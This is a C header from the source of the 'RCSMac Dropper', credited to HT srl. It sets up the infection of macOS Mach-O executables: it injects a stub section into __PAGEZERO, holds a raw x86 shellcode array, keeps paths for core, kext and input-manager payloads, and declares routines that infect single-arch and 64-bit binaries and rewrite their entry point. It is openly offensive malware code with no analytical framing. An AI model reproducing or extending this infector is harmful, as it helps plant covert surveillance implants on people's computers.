/*
 * RCSMac Dropper
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 20/07/2009
 * Win32 porting by Massimo Chiodini on 02/11/2009 
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#ifdef WIN32
#pragma once
#include <Windows.h>
#endif

#include "RCSMacInfectorUtil.h"

#define INJECTED_SECTION_NAME "__init_stub"
#define INJECTED_SEGMENT_NAME "__PAGEZERO"

#define PAGE_ALIGNMENT  0x1000
#define MH_EXECUTE      0x2


int numberOfResources;

//
// Type of strings
//
#define STRING_SYMBOL   0x0001
#define STRING_DATA     0x0002

#define CPU_ARCH_ABI64  0x01000000    /* 64 bit ABI */
#define CPU_TYPE_X86    0x7
#define CPU_TYPE_X86_64 (CPU_TYPE_X86 | CPU_ARCH_ABI64)

unsigned char crtStart[] = "\x6a\x00\x89\xe5\x83\xe4\xf0\x83\xec"
                           "\x10\x8b\x5d\x04\x89\x5c\x24\x00\x8d"
                           "\x4d\x08\x89\x4c\x24\x04\x83\xc3\x01"
                           "\xc1\xe3\x02\x01\xcb\x89\x5c\x24\x08"
                           "\x8b\x03\x83\xc3\x04\x85\xc0\x75\xf7"
                           "\x89\x5c\x24\x0c\xe8";

char *coreFilePath;
char *confFilePath;
char *kextFilePath;
char *inputManagerFilePath;
char *iconFilePath;
char *installPath;
char *inputFilePath;
char *outputFilePath;

int gCoreFileSize;
int gConfFileSize;
int gKextFileSize;
int gInputManagerFileSize;
int gIconFileSize;
int gInputFileSize;

int gFileType; // 0 = SingleArch, 1 = FAT, 2 = FAT (swap)
int gNumStrings;
struct fat_header gFatHeader;

uint32_t
getBinaryEP_32 (void *machoBase);

int
setBinaryEP_32 (void *machoBase, uint32_t anEntryPoint);

int infectSingleArch (char *inputFilePointer,
                      char *outputFilePointer,
                      int inOffsetToArch,
                      int outOffsetToArch,
                      int inputFileSize,
                      int outputFileSize);

int infectSingleArch64 (char *inputFilePointer,
                        char *outputFilePointer,
                        int inOffsetToArch,
                        int outOffsetToArch,
                        int inputFileSize,
                        int outputFileSize);

int
infectBinary (int aBinaryType,
              int fileSize,
              char *inputFilePointer,
              char *outputFilePointer,
              int outputFileSize,
              unsigned int *segmentVMAddr);

int
getBinaryFormat (char *aFilePointer);

void
usage (_mChar *aBinaryName);

int
parseArguments (int argc, char **argv);